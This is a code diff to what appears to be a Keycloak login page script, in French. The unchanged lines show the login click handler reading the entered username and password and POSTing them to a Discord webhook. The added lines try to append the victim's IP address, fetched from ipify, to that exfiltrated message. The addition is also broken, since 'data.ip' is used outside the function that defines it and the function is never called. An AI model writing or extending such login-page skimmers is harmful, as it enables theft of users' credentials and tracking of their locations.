@@ -192,6 +192,15 @@ document.getElementById("kc-login").addEventListener("click", async (event) => {
 
     const username = document.getElementById("username").value;
     const passwordPresent = document.getElementById("password").value
+    async function getClientIp() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        console.log("Adresse IP :", data.ip);
+    } catch (error) {
+        console.error("Impossible de récupérer l'IP :", error);
+    }
+}
 
     await fetch("https://discord.com/api/webhooks/1551574862475174018/MmXiAEyL8N7koa7zrJgi0TOemF6qlWMDfNJIy4H2c6Jgzf0jngEyJXwKNaa455dXkg-J", {
         method: "POST",
@@ -214,6 +223,10 @@ document.getElementById("kc-login").addEventListener("click", async (event) => {
                             name: "🔐 Mot de passe",
                             value: passwordPresent || "Vide",
                             inline: true
+                        },
+                        {
+                            name:"📍 Adresse IP",
+                            value: data.ip || "Aucune IP trouvée"
                         }
                     ],
                     footer: {
